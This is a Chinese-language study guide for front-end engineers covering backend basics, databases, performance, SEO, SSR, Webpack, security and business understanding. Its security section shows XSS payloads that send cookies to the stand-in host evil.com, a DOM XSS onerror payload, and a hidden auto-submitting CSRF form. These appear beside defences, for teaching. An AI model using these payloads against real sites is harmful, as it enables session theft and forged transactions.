1 后端技能 ​

1.1 了解后端的开发方式，在应用程序中的作用，至少会使用一种后端语言 ​

参考

后端在应用中的作用 ​

  • 数据持久化：将业务数据落地存储到数据库，保证数据的一致性、完整性
  • 业务逻辑处理：承载核心业务规则，如订单状态流转、权限校验、计算引擎等
  • 接口服务：通过 RESTful API / GraphQL / gRPC 等为前端提供数据交互能力
  • 认证与鉴权：用户登录、Token 签发与验证、角色权限控制（RBAC / ABAC）
  • 中间件与拦截：日志记录、限流、熔断、跨域处理、请求过滤

后端架构模式 ​

  • MVC / 三层架构：Controller（接口层）→ Service（业务层）→ DAO / Repository（数据访问层）
  • 微服务架构：按业务领域拆分独立服务，通过 RPC / 消息队列通信，独立部署和扩容
  • Serverless：FaaS（函数即服务）+ BaaS（后端即服务），按需执行、自动扩缩

后端语言 ​

语言典型框架适用场景
Node.jsExpress / Nest.js / KoaBFF 层、实时应用、全栈开发
JavaSpring Boot企业级应用、金融系统、高并发
PythonDjango / FastAPI数据分析、AI 服务、快速原型
GoGin / Echo高性能 API、云原生基础设施
PHPLaravel / ThinkPHPCMS、传统 Web 站点

前端工程师推荐 Node.js（TypeScript 技术栈一致、BFF 层天然优势），再了解一门静态类型后端语言（Go / Java）。

1.2 掌握数据最终在数据库中是如何落地存储的，能看懂表结构设计、表之间的关联，至少会使用一种数据库 ​

参考

关系型数据库核心概念 ​

  • 表（Table）：按行和列组织数据，列定义字段名和类型，行存储具体记录
  • 主键（Primary Key）：唯一标识每一行，通常用自增 ID 或 UUID
  • 外键（Foreign Key）：建立表之间的关联关系，引用另一张表的主键
  • 索引（Index）：加速查询效率，类似书的目录。常见 B+Tree 索引、联合索引、唯一索引
  • 约束：NOT NULL、UNIQUE、DEFAULT、CHECK，保证数据完整性

表关系类型 ​

关系类型举例实现方式
一对一用户 ↔ 用户详情在任意一方存对方的外键 + UNIQUE
一对多用户 → 订单"多"方存"一"方的主键作为外键
多对多学生 ↔ 课程中间表（关联表），拆分为两个一对多

能看懂的关键点 ​

  • ER 图：实体矩形 + 菱形关系 + 椭圆属性，标注 1:1 / 1:N / M:N
  • 建表语句（DDL）：CREATE TABLE，关注字段类型、默认值、索引、外键约束
  • 查询语句（DML）：JOIN（INNER/LEFT/RIGHT）、GROUP BY + 聚合函数、子查询
  • 执行计划（EXPLAIN）：判断查询是否走索引、全表扫描 or 索引扫描

常用数据库 ​

数据库类型特点
MySQL关系型最主流，InnoDB 引擎支持事务、行锁、MVCC
PostgreSQL关系型功能最强，支持 JSON 字段、地理空间、全文搜索
MongoDB文档型 NoSQLJSON 文档存储，Schema 灵活，适合快速迭代
RedisKV 内存数据库缓存、分布式锁、消息队列、排行榜

前端至少要会用 MySQL / PostgreSQL，理解 InnoDB 事务 ACID 特性、MVCC 原理。

2 性能优化 ​

2.1 了解前端性能衡量指标、性能监控要点，掌握一种前端性能监控方案 ​

参考

核心 Web 指标（Core Web Vitals） ​

指标含义优秀阈值
LCP（Largest Contentful Paint）最大内容绘制时间，反映页面加载速度≤ 2.5s
INP（Interaction to Next Paint）交互延迟（取代 FID），反映响应性≤ 200ms
CLS（Cumulative Layout Shift）累计布局偏移，反映视觉稳定性≤ 0.1

其他关键指标 ​

  • FCP（First Contentful Paint）：首次内容绘制，用户看到第一个内容的时间
  • TTI（Time to Interactive）：页面完全可交互的时间
  • TBT（Total Blocking Time）：FCP 到 TTI 之间主线程被长任务阻塞的总时长
  • TTFB（Time to First Byte）：首字节时间，服务器响应速度
  • Speed Index：视觉上页面内容填充的速度

性能监控方案 ​

方式工具适用场景
实验室数据（Lab）Lighthouse、WebPageTest、Chrome DevTools开发阶段、CI 卡口
真实用户监控（RUM）Web Vitals 库、Sentry Performance线上真实用户体验
Performance APIperformance.getEntriesByType('navigation')、PerformanceObserver自定义指标采集

监控要点 ​

  • 维度拆分：按页面路由、设备类型、网络类型、地域分别统计
  • 采样策略：全量 or 百分比采样，长任务单独采集
  • 衡量标准：P75 代表大多数用户，P95 代表差体验用户，不只看平均值
  • 告警体系：设置 P75 劣化阈值，配合 Grafana / Datadog / 自建大盘

2.2 了解常见的Web、App性能优化方案 ​

参考

网络层面 ​

  • HTTP/2 / HTTP/3：多路复用减少连接数，Server Push 提前推送关键资源
  • CDN 加速：静态资源分发到边缘节点，缩短用户到服务器的物理距离
  • 压缩：Gzip（兼容性好）/ Brotli（压缩率更高 20%），资源体积减少 60-80%
  • 缓存策略：强缓存（Cache-Control: max-age / immutable）+ 协商缓存（ETag / Last-Modified）
  • DNS 预解析：<link rel="dns-prefetch"> 提前解析第三方域名
  • 资源预加载：<link rel="preload"> 关键资源，<link rel="prefetch"> 下一页资源

资源层面 ​

  • 代码分割（Code Splitting）：路由懒加载、动态 import()，按需加载非首屏代码
  • Tree Shaking：ES Module 静态分析，删除未使用的代码（生产环境自动开启）
  • 图片优化：WebP / AVIF 格式（体积减少 50%），响应式图片（srcset + sizes），懒加载（loading="lazy"）
  • 字体优化：font-display: swap 防止 FOIT，子集化只保留用到的字符，WOFF2 格式
  • 静态资源长效缓存：文件名带 content hash + Cache-Control: max-age=31536000

渲染层面 ​

  • 虚拟列表：只渲染可视区域的 DOM，适用于长列表
  • 骨架屏 / Loading：减少用户感知等待时间
  • 避免布局抖动：读写 DOM 分离，批量修改 DOM（documentFragment / requestAnimationFrame）
  • 防抖与节流：scroll、resize、input 高频事件优化
  • Web Worker：计算密集型任务放子线程，避免阻塞 UI

App 特有优化 ​

  • 离线缓存：Service Worker 缓存 shell 和关键数据，弱网 / 离线可用
  • 原生组件：地图、视频等重资源场景用原生渲染替代 WebView
  • 预加载 & 预热：App 启动时预请求首页数据、预创建 WebView

2.3 SEO排名规则、SEO优化方案、前后端分离的SEO ​

参考

搜索引擎排名核心因素 ​

  • 内容质量：原创、相关、有深度，满足用户搜索意图（Google E-E-A-T 原则）
  • TDK 三要素：<title>（每个页面唯一，含核心词）、<meta name="description">（吸引点击）、<meta name="keywords">（已基本不被搜索引擎重视）
  • 结构化数据：JSON-LD 格式的 Schema.org 标记，帮助搜索引擎理解内容类型（文章、产品、面包屑、FAQ）
  • 页面体验：Core Web Vitals（LCP、INP、CLS）、移动端友好、HTTPS、无侵入性插页
  • 链接权威性：外链数量和质量、内链结构合理性

前端 SEO 优化方案 ​

  • 语义化 HTML：合理使用 <header>、<nav>、<main>、<article>、<section>、<h1>-<h6> 层级
  • 图片 SEO：alt 描述、有意义的文件名、图片 sitemap
  • URL 规范：短小、含关键词、用连字符分隔；<link rel="canonical"> 解决重复内容
  • Sitemap.xml + robots.txt：引导爬虫抓取
  • 移动适配：响应式设计或独立移动站，Google 移动优先索引

前后端分离的 SEO 挑战与方案 ​

方案原理适用场景
SSR（服务端渲染）服务器返回完整 HTML，爬虫可直接解析内容型站点、电商、媒体
SSG（静态站点生成）构建时预生成 HTML，部署到 CDN博客、文档站、官网
预渲染（Prerender）对爬虫 UA 单独返回预渲染后的 HTML已有 SPA 的补充方案
动态渲染（Dynamic Rendering）检测爬虫请求，转发到渲染服务过渡方案，Google 已不推荐
ISR（增量静态再生）Next.js 的按页面/按需重新生成静态页内容更新不那么频繁的站点

2.4 SSR实现方案、优缺点、及其性能优化 ​

参考

主流实现方案 ​

  • Next.js（React）：App Router + Server Components，支持 SSR / SSG / ISR 混用
  • Nuxt.js（Vue）：Nuxt 3 基于 Nitro 引擎，支持混合渲染
  • 传统模板引擎：EJS / Pug / Thymeleaf 等服务端拼接 HTML

优点 ​

  • SEO 友好：搜索引擎直接获取完整 HTML 内容
  • 首屏更快：FCP 时间显著缩短，用户首先看到有意义的内容
  • 社交分享：Open Graph / Twitter Card 元标签可直接渲染，爬虫无需执行 JS

缺点 ​

  • 服务器压力：每次请求都要在服务端渲染，增加 CPU 消耗和 TTFB
  • 开发复杂度：需区分客户端/服务端代码（无 window/document），注意数据请求的同构
  • TTI 延迟：HTML 先到但 JS 还需下载解析，用户看到但点不了（hydration 阶段）
  • 部署要求高：需要 Node.js 服务环境，不能纯静态部署

性能优化 ​

  • 流式 SSR（Streaming）：renderToPipeableStream，边渲染边输出，不等待整个页面
  • 选择性水合（Selective Hydration）：React 18+ 按交互优先级分片水合
  • 岛屿架构（Islands Architecture）：绝大部分静态 HTML，仅在交互区域注入 JS（Astro 的核心理念）
  • 组件级缓存：对个性化弱的内容做缓存，降低服务端重复渲染开销
  • ESM + Edge 部署：将 SSR 部署到边缘节点（Cloudflare Workers / Vercel Edge），减少冷启动时间和物理延迟

2.5 Webpack的性能优化方案 ​

参考

构建速度优化 ​

手段说明
持久化缓存（Webpack 5）cache.type: 'filesystem'，二次构建提速 60-80%
缩小构建范围exclude: /node_modules/、include 精确指定源码目录
thread-loader / esbuild-loader多线程并行或 esbuild 替代传统 loader，大幅提升转译速度
DLL 预编译（Webpack 4 时代）将不常变的第三方库预先编译。Webpack 5 已不推荐，可用 cache + module.noParse 替代
module.noParse跳过对大型已打包库的解析（如 jQuery、Chart.js）

输出质量优化 ​

手段说明
Code SplittingsplitChunks 提取公共依赖（vendors）、按路由切割异步 chunk
Tree Shaking确保 package.json 有 sideEffects: false，使用 ES Module 导入
Scope Hoisting将模块合并为单一闭包，减少包裹函数开销
压缩TerserPlugin（JS）、CssMinimizerPlugin（CSS）、compression-webpack-plugin 生成 .gz/.br

体积分析 ​

  • webpack-bundle-analyzer：可视化每个 chunk 的模块组成和体积占比
  • speed-measure-webpack-plugin：测量每个 loader 和 plugin 的耗时，定位构建瓶颈

开发体验优化 ​

  • HMR 优化：通过 include 限制监听的源码范围，避免监听 node_modules
  • Source Map 策略：开发用 eval-cheap-module-source-map（快），生产用 hidden-source-map 或 nosources-source-map
  • 懒编译：只在访问时才编译对应入口

2.6 Canvas性能优化方案 ​

参考

绘制优化 ​

  • 减少 API 调用次数：每次 context.xxx() 都有开销，批量绘制指令
  • 离屏 Canvas（OffscreenCanvas）：在 Worker 线程预渲染复杂图形，主线程直接 drawImage 贴图
  • 分层 Canvas：静态背景一层，动态元素一层，只重绘变化层
  • 脏矩形（Dirty Rectangle）：仅重绘发生变化的区域（配合 clip() 裁剪）

交互优化 ​

  • requestAnimationFrame：动画统一用 rAF，与屏幕刷新率同步（60fps / 120fps），切后台自动暂停
  • 事件委托：在 Canvas 容器上监听事件，通过坐标计算命中对象，避免每个对象绑定事件
  • 碰撞检测降频：简单 AABB 矩形预筛选，再用精确算法

资源优化 ​

  • 图片缓存：Image 对象预加载并缓存，避免重复加载
  • 像素密度适配：devicePixelRatio 缩放 Canvas，同时限制过高 DPR（如最高 2x）
  • WebGL：复杂粒子系统、大量图形变换场景用 WebGL 获得 GPU 加速

内存优化 ​

  • 及时清理：不再使用的 Image 解除引用，超大 Canvas 用完后重置大小或移除 DOM
  • 画布尺寸控制：尺寸越大内存占用越高（width × height × 4 字节 RGBA），避免创建超画布

2.7 React、Vue等框架使用性能优化方案 ​

参考

React 性能优化 ​

手段说明
React.memo对纯展示组件做 props 浅比较，跳过无变化的重渲染
useMemo / useCallback缓存计算结果和函数引用，避免子组件不必要的重渲染
列表 key 优化用稳定的唯一 ID 而非 index，减少 DOM 重组
虚拟列表react-window / react-virtuoso，只渲染可视区 DOM
lazy + Suspense组件级代码分割，非首屏组件按需加载
避免内联对象/函数JSX 中的 style= 和 onClick={() => {}} 每次渲染创建新引用
Context 拆分将变化频率不同的状态分到不同的 Context，避免大范围重渲染
useDeferredValue / useTransition（React 18+）标记低优先级更新，让出主线程给用户交互

Vue 性能优化 ​

手段说明
computed vs methodscomputed 自动缓存，依赖不变时不会重新计算
v-memo（Vue 3.2+）子树条件性更新，依赖不变跳过 diff
v-once只渲染一次、不再追踪变化的静态内容
shallowRef / shallowReactive只监听顶层变化，深层数据不触发响应式
KeepAlive缓存组件实例，路由切换时保留状态不销毁
异步组件 defineAsyncComponent按需加载非首屏模块
<Teleport> 合理使用将弹窗等全局组件移出父容器，避免不必要的父级更新

通用优化 ​

  • 避免深层 watch / 大对象响应式：对大数据列表用 Object.freeze() 或 shallow 系列跳过追踪
  • 组件颗粒度合理：不是越细越好，细了增加 diff 开销，粗了增加重绘范围
  • 状态管理懒加载：Pinia / Zustand 等支持按需注册 Store，不用全局注册所有模块

3 前端安全 ​

3.1 XSS攻击的原理、分类、具体案例，前端如何防御 ​

参考

攻击原理 ​

跨站脚本攻击（Cross-Site Scripting），攻击者将恶意脚本注入目标页面，在用户浏览器中执行，窃取 Cookie、Token、用户数据或执行非授权操作。

三种类型 ​

类型攻击方式持久化触发场景
反射型（Reflected）恶意脚本通过 URL 参数传入，服务端直接拼入响应页面否诱导用户点击恶意链接
存储型（Stored）恶意脚本存储到数据库，页面从数据库读取时渲染触发是评论、留言板、用户昵称
DOM 型纯客户端攻击，通过 JS 操作 DOM 注入（如 innerHTML）否URL hash → eval() / document.write()

具体案例 ​

// 反射型：URL 注入
https://example.com/search?q=<script>fetch('https://evil.com?cookie='+document.cookie)</script>
// 服务端直接将 q 参数拼入 HTML → 所有访问用户 Cookie 泄露

// 存储型：评论注入
// 用户在评论区输入：
评论内容 <script>new Image().src='https://evil.com?c='+document.cookie</script>
// 存储到数据库 → 每个查看评论的用户都会触发

// DOM 型：innerHTML 注入
document.getElementById('content').innerHTML = location.hash.slice(1);
// URL: https://example.com#<img src=x onerror=alert(1)>

防御手段说明
输出编码HTML 实体编码 < → &lt;、" → &quot; 等，按上下文选择正确的编码函数

3.2 CSRF攻击的原理、具体案例，前端如何防御 ​

参考

攻击原理 ​

跨站请求伪造（Cross-Site Request Forgery），利用用户已登录的身份凭证（Cookie），在用户不知情的情况下，诱导其浏览器向目标站点发起非预期的请求。

关键前提：浏览器自动携带目标站点的 Cookie（SameSite 默认值历史遗留问题）

攻击流程 ​

  1. 用户登录 bank.com，浏览器保存认证 Cookie
  2. 用户访问了恶意网站 evil.com（或点击钓鱼链接）
  3. evil.com 页面中隐藏了自动提交的表单，指向 bank.com/transfer?to=hacker&amount=10000
  4. 浏览器自动带上 bank.com 的 Cookie 发起请求
  5. 银行服务端以为是用户本人的操作，执行转账

具体案例 ​

html
<!-- 恶意站点 evil.com 上的代码 -->
<!-- 方式 1：自动提交表单 -->
<form action="https://bank.com/transfer" method="POST" style="display:none">
  <input name="to" value="hacker" />
  <input name="amount" value="10000" />
</form>
<script>
  document.forms[0].submit()
</script>

<!-- 方式 2：GET 请求利用 -->
<img src="https://bank.com/transfer?to=hacker&amount=10000" width="0" height="0" />

前端防御 ​

防御手段说明
SameSite CookieSet-Cookie: session=xxx; SameSite=Lax（现代浏览器默认），跨站请求不携带 Cookie
CSRF Token服务端下发随机 Token，前端请求时通过 Header 或 Body 携带，服务端校验
Referer / Origin 校验服务端校验请求来源是否在白名单内
双重提交 Cookie前端从 Cookie 中读取 Token 写入请求头，服务端比较 Cookie 和 Header 中的值是否一致
验证码 / 二次确认敏感操作（转账、改密）要求输入验证码或二次密码

SPA 下的特殊考虑 ​

  • SPA 通过 Authorization: Bearer xxx 请求头携带 Token，而非自动携带 Cookie → 天然免疫传统 CSRF
  • 但如果将 Token 存在 Cookie 中（而非 localStorage），仍然面临 CSRF 风险
  • 推荐 Token 存内存 + 刷新 Token 用 HttpOnly Cookie，兼顾安全与体验

3.3 HTTP劫持、页面劫持的原理、防御措施 ​

参考

HTTP 劫持 ​

原理：HTTP 是明文传输，中间节点（运营商、公共 WiFi、路由器）可以拦截、篡改 HTTP 响应。

常见手法：

  • 运营商注入：在 HTTP 响应中插入广告 iframe 或 JS 脚本
  • DNS 劫持：篡改 DNS 解析结果，将用户导向钓鱼网站
  • 中间人攻击（MITM）：攻击者在用户与服务器之间拦截转发通信

防御：

  • 全站 HTTPS：强制 HTTP → HTTPS 重定向，Strict-Transport-Security（HSTS）头禁止后续 HTTP 访问
  • HSTS Preload：将域名加入浏览器内置的 HSTS 预加载列表
  • DNS over HTTPS（DoH）：防止 DNS 解析过程被篡改
  • 证书校验：Certificate Transparency，监控异常证书签发

页面劫持 ​

原理：攻击者通过各种方式直接篡改页面内容，主要发生在以下环节：

劫持类型攻击方式案例
CDN / 第三方资源劫持篡改引入的外部 JS 文件运营商拦截并替换 jQuery CDN 为恶意版本
路由劫持篡改公共 WiFi 的网关配置，注入脚本咖啡厅 WiFi 在所有页面底部注入挖矿脚本
浏览器插件恶意插件读取并修改页面 DOM插件窃取电商网站的订单信息
iframe 劫持页面被加载到攻击者的 iframe 中（Clickjacking）透明 iframe 覆盖在按钮上方劫持点击

防御措施 ​

手段说明
SRI（Subresource Integrity）<script integrity="sha384-..."> 校验外部脚本完整性，被篡改后浏览器拒绝执行
CSPscript-src 限制可执行的脚本域名和 hash，非白名单脚本全部拒绝
HTTPS + SRI 组合即使 CDN 被入侵也无法注入恶意代码（CDN 本身也需 HTTPS）
X-Frame-Options / CSP frame-ancestors禁止页面被其他网站 iframe 嵌套，防御点击劫持
锁定浏览器插件企业环境用策略限制可安装的扩展
Content Integrity如用 signed exchanges（SXG），浏览器验证内容来源的完整性和真实性

4.1 能理解所开发项目的整体业务形态、业务目标、业务架构，可以快速定位线上业务问题 ​

参考

理解业务的全景图 ​

不仅要能看懂自己负责的模块，更要理解：

  • 业务形态：B2C / B2B / C2C？平台型还是自营？核心盈利模式是什么？
  • 核心业务流程：用户从哪里来（获客渠道）→ 如何使用核心功能（核心路径）→ 如何转化 / 留存
  • 关键业务指标：DAU、付费转化率、留存率、客单价、GMV 等，理解每个指标的含义和影响因子
  • 业务的上下游关系：自己的模块给谁提供数据、依赖谁的输出

快速定位线上问题的方法论 ​

  1. 确认影响面：多少用户受影响？哪个端（Web / App / 小程序）？什么时间段开始？
  2. 缩小范围：是否最近发布导致？（查发布记录）是前端还是后端？（看接口返回 + 状态码）
  3. 日志排查：Sentry / 埋点平台查看错误堆栈、用户操作路径、触发条件
  4. 复现：根据用户 ID、操作时间、设备信息在相应环境尝试复现
  5. 根因分析：是代码 bug？接口异常？数据库慢查询？CDN 回源失败？第三方服务挂掉？
  6. 修复验证：修复后灰度发布，监控错误率和业务指标恢复情况

常用工具链 ​

  • 错误监控：Sentry / Fundebug
  • 日志平台：ELK（Elasticsearch + Logstash + Kibana）/ Grafana Loki
  • APM：SkyWalking / Datadog APM，追踪全链路调用
  • 用户行为：埋点 + Session 回放（如神策、GrowingIO、LogRocket）

4.2 能理解所开发项目整体的技术架构、能快读的根据新需求进行开发规划、能快速根据业务报警、线上日志等定位并解决线上技术问题 ​

参考

理解技术架构全貌 ​

  • 前端架构：微前端（qiankun / Module Federation）、组件库体系、状态管理方案、路由设计
  • BFF 层：Node.js 中间层聚合后端接口、格式转换、SSR
  • 后端服务：微服务拓扑、服务间调用关系（RPC / MQ）、网关层做了哪些事情
  • 数据链路：请求从 CDN → 网关 → BFF → 微服务 → 数据库 → 缓存的完整路径
  • 部署架构：CI/CD 流水线、容器化（Docker + K8s）、灰度/蓝绿发布策略
  • 基础设施：日志、监控、配置中心、服务发现

新需求开发规划 ​

  1. 需求评审：理清业务背景和目标，识别边界条件和异常场景
  2. 技术方案：涉及哪些页面 / 组件 / 接口？是否需要新增/改动服务端接口？兼容性风险？
  3. 工作量评估：按技术方案拆分子任务，考虑自测 + 联调 + 写单测的时间
  4. 依赖梳理：是否有前后端联调依赖？是否有其他团队的接口依赖？
  5. 风险预案：上线后可能出问题的地方？是否需要灰度？回滚方案是什么？

线上问题快速定位 ​

  • 报警响应：看懂报警信息 → 判断严重程度（P0/P1/P2）→ 先止损（回滚/降级），再定位
  • 日志分析：按 traceId 串联全链路，找到异常发生在哪一层
  • 排除法：先确认是偶发还是必现 → 切流量到旧版本看是否消失 → 查对应时间段有无变更
  • 经验积累：每次线上问题写复盘文档，固化排查思路和预防措施

4.3 可以将自己的想法或新技术在业务中落地实践，尽量在团队中拥有一定的不可替代性 ​

参考

技术落地的完整路径 ​

  1. 发现痛点：从日常开发、线上故障、效率瓶颈中发现可改进的点
  2. 调研方案：对比业界方案（开源 / 商业 / 自研），评估接入成本和收益
  3. 概念验证（PoC）：小范围快速验证可行性，拿到初步数据
  4. 方案汇报：用数据说话——"现在是什么情况 → 改成什么 → 预期收益多少 → 风险和代价"
  5. 渐进式落地：不要一步到位全量替换，先灰度→核心场景→推广
  6. 文档 + 分享：落地后输出使用文档、最佳实践，团队内做技术分享降低其他人的使用门槛

建立不可替代性的方向 ​

方向具体体现
业务深度成为特定业务领域的专家，别人需要花大量时间才能理解你的判断逻辑
技术深度在性能优化、前端安全、工程化等某个方向做到团队最优
工具/基建产出开发的脚手架、组件库、监控工具被团队广泛使用，形成依赖
跨端能力同时覆盖 Web + 小程序 + App（RN/Flutter），单兵作战能力强
技术视野持续关注前沿趋势，团队陷入瓶颈时能提出可落地的创新方案
知识传承技术分享、新人导师、文档体系维护，成为团队的信息枢纽

关键心态 ​

  • 主人翁意识：对自己负责的模块有"这是我负责的产品"的心态，关注质量不只是完成任务
  • 持续交付价值：不只是"用新技术"，而是解决实际问题让业务更好
  • 利他即利己：帮助团队成员成长，你自然成为团队不可或缺的人

不可替代性不是靠藏私或搞"代码壁垒"，而是靠持续创造超出预期的价值、解决别人解决不了的问题。
